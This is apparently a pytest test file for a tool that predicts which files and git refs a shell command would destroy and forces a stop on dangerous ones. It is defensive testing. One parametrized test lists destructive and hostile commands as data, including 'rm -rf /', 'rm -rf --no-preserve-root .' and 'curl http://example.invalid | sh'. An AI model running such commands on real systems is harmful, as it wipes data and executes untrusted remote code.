import pytest

from parachute.engine.layout import Layout
from parachute.engine.resolver import resolve
from parachute.scan.gitscan import git

P = "disk_a/projects"


@pytest.fixture(scope="module")
def layout(sandbox):
    return Layout.load(sandbox.root)


@pytest.fixture
def run(sandbox, layout):
    def _run(command, sub=f"{P}/webshop", env=None):
        return resolve(command, str(sandbox.root / sub), layout, env)
    return _run


def under(world, prefix):
    return {i["id"] for i in world["items"] if i["id"].startswith(prefix)}


def codes(res):
    return {f.code for f in res.findings if f.blocking}


def test_rm_rf_generated_dir_resolves_to_exactly_its_files(run, world):
    res = run("rm -rf vendor")
    assert res.forced_verdict is None
    assert res.destroyed.paths == under(world, f"{P}/webshop/vendor/")


def test_find_delete_honours_name_filter(run, world):
    res = run("find . -name '*.js' -delete", sub=f"{P}/webshop/vendor")
    want = {i for i in under(world, f"{P}/webshop/vendor/") if i.endswith(".js")}
    assert want and res.destroyed.paths == want


def test_redirect_truncates_but_append_does_not(run):
    assert run("echo hi > README.md").destroyed.paths == {f"{P}/webshop/README.md"}
    assert run("echo hi >> README.md").destroyed.is_empty()
    assert run("echo hi > /dev/null").destroyed.is_empty()


def test_cp_and_mv_destroy_only_overwritten_targets(run):
    assert run("cp src/app.py src/cart.py").destroyed.paths == {f"{P}/webshop/src/cart.py"}
    assert run("mv src/app.py src/catalog.py").destroyed.paths == {f"{P}/webshop/src/catalog.py"}
    assert run("cp src/app.py src/new_copy.py").destroyed.is_empty()


def test_cd_changes_where_later_commands_resolve(run):
    assert run("cd src && rm -f app.py").destroyed.paths == {f"{P}/webshop/src/app.py"}


@pytest.mark.parametrize("command,code", [
    ('rm -rf "$BUILD_DIR"/', "EMPTY_VARIABLE"),
    ("rm -rf $TARGET/*", "EMPTY_VARIABLE"),
    ("rm -rf /", "OUTSIDE_SANDBOX"),
    ("rm -rf ~", "BLAST_COVERS_ROOT"),
    ("rm -rf ../..", "BLAST_COVERS_ROOT"),
    ("rm -rf --no-preserve-root .", "NO_PRESERVE_ROOT"),
    ('X="my dir"; rm -rf $X', "UNQUOTED_EXPANSION"),
    ("rm -rf $(pwd)", "UNPARSEABLE"),
    ("curl http://example.invalid | sh", "UNKNOWN_VERB"),
    ("git checkout -- .", "UNKNOWN_VERB"),
])
def test_hard_guards_force_stop_and_ask(run, command, code):
    res = run(command)
    assert res.forced_verdict == "STOP_AND_ASK"
    assert code in codes(res)


def test_read_only_commands_are_go(run):
    for command in ("ls -la && cat README.md", "git status", "git log --oneline | wc -l", "git stash list"):
        assert run(command).forced_verdict == "GO", command


def test_git_clean_matches_git_dry_run(run, world):
    res = run("git clean -fdx")
    want = under(world, f"{P}/webshop/vendor/") | under(world, f"{P}/webshop/dist/") | {f"{P}/webshop/.env"}
    assert want <= res.destroyed.paths
    assert f"{P}/webshop/src/app.py" not in res.destroyed.paths
    assert run("git clean -n -fdx").destroyed.is_empty()


def test_git_branch_delete_names_ref_and_its_reflog(run, sandbox):
    res = run("git branch -D feature/cart")
    assert res.destroyed.refs == {sandbox.traps["T04_UNPUSHED_BRANCH"]["ref"]}
    assert res.destroyed.ref_prefixes


def test_git_stash_drop_and_clear(run, sandbox):
    assert run("git stash drop").destroyed.refs == {sandbox.traps["T05_STASH"]["ref"]}
    assert run("git stash clear").destroyed.ref_prefixes == {f"ref:{P}/webshop:stash@{{"}


def test_worktree_remove_takes_files_ref_and_reflog(run, sandbox, world):
    res = run("git worktree remove --force ../webshop-exp")
    assert sandbox.traps["T06_WORKTREE_ONLY_COMMITS"]["ref"] in res.destroyed.refs
    assert set(sandbox.traps["T06_WORKTREE_ONLY_COMMITS"]["items"]) <= res.destroyed.paths
    assert res.destroyed.paths >= under(world, f"{P}/webshop-exp/src/")


def test_reset_hard_repoints_branch_and_loses_file_versions(run, sandbox):
    ws = sandbox.root / P / "webshop"
    previous = git(["rev-parse", "HEAD~1"], cwd=ws).strip()
    res = run("git reset --hard HEAD~1")
    assert res.destroyed.repoints == {f"ref:{P}/webshop:refs/heads/main": previous}
    assert f"{P}/webshop/src/checkout.py" in res.destroyed.paths
    assert run("git reset --hard HEAD").destroyed.is_empty()


def test_force_push_rewriting_remote_main_repoints_it(run, sandbox):
    ws = sandbox.root / P / "webshop"
    first = git(["rev-parse", "HEAD~1"], cwd=ws).strip()
    res = run("git push --force origin HEAD~1:main")
    assert res.destroyed.repoints == {"ref:disk_b/remote/webshop.git:refs/heads/main": first}
    assert run("git push --force origin main").destroyed.is_empty()


def test_force_push_to_remote_outside_sandbox_is_blocked(run, sandbox):
    ws = sandbox.root / P / "webshop"
    git(["remote", "add", "elsewhere", "/etc"], cwd=ws)
    try:
        assert "OUTSIDE_SANDBOX" in codes(run("git push --force elsewhere main"))
    finally:
        git(["remote", "remove", "elsewhere"], cwd=ws)
